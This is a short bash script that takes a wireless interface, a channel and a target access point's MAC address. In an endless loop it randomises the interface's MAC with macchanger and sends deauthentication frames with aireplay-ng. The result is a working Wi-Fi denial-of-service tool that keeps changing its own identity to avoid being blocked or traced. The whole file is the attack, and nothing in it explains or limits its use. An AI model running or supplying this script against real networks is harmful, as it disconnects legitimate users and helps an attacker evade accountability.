#!/bin/bash

##$1 -> Interface name
##$2 -> Target channel 
##$3 -> Target MAC addres

iw dev $1 set channel $2

while true
do
	sleep 3
	ip link set $1 down
	macchanger -r $1
	ip link set $1 up
	aireplay-ng --deauth 3 -a $3 $1
	echo " "
done
